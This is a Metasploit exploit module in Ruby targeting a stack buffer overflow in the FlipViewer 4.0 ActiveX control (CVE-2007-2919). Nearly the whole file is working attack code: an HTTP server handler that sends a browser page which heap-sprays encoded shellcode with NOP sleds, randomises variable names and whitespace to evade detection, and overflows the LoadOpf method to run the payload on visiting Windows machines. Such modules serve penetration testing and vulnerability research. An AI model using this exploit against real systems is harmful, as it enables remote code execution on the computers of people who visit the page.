##
# $Id: ebook_flipviewer_fviewerloading.rb 9525 2010-06-15 07:18:08Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'FlipViewer FViewerLoading ActiveX Control Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in E-BOOK Systems FlipViewer 4.0.
				The vulnerability is caused due to a boundary error in the
				FViewerLoading (FlipViewerX.dll) ActiveX control when handling the
				"LoadOpf()" method.
			},
			'License'        => BSD_LICENSE,
			'Author'         => [ 'LSO <lso@hushmail.com>' ],
			'Version'        => '$Revision: 9525 $',
			'References'     =>
				[
					[ 'CVE', '2007-2919' ],
					[ 'OSVDB', '37042' ],
					[ 'BID', '24328' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Tested ok patrickw 20090303
					[ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0A0A0A0A } ],
				],
			'DisclosureDate' => 'Jun 6 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		return if ((p = regenerate_payload(cli)) == nil)

		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		nops    = Rex::Text.to_unescape(make_nops(4))

		ret     = Rex::Text.uri_encode([target.ret].pack('L'))

		vname  = rand_text_alpha(rand(100) + 1)
		var_i  = rand_text_alpha(rand(30)  + 2)
		rand1  = rand_text_alpha(rand(100) + 1)
		rand2  = rand_text_alpha(rand(100) + 1)
		rand3  = rand_text_alpha(rand(100) + 1)
		rand4  = rand_text_alpha(rand(100) + 1)
		rand5  = rand_text_alpha(rand(100) + 1)
		rand6  = rand_text_alpha(rand(100) + 1)
		rand7  = rand_text_alpha(rand(100) + 1)
		rand8  = rand_text_alpha(rand(100) + 1)

		content = %Q|<html>
<object classid='clsid:BA83FD38-CE14-4DA3-BEF5-96050D55F78A' id='#{vname}'></object>
<script language='javascript'>
var #{rand1} = unescape('#{shellcode}');
var #{rand2} = unescape('#{nops}');
var #{rand3} = 20;
var #{rand4} = #{rand3} + #{rand1}.length;
while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};
var #{rand5} = #{rand2}.substring(0,#{rand4});
var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});
while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};
var #{rand7} = new Array();
for (#{var_i} = 0; #{var_i} < 400; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }
var #{rand8} = "";
for (#{var_i} = 0; #{var_i} < 1324; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') }
#{vname}.LoadOpf(#{vname}, #{vname}, #{vname}, #{vname}, #{vname}, #{vname}, #{vname}, #{rand8});
</script>
</html>
|

		content = Rex::Text.randomize_space(content)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		send_response_html(cli, content)

		handler(cli)
	end

end

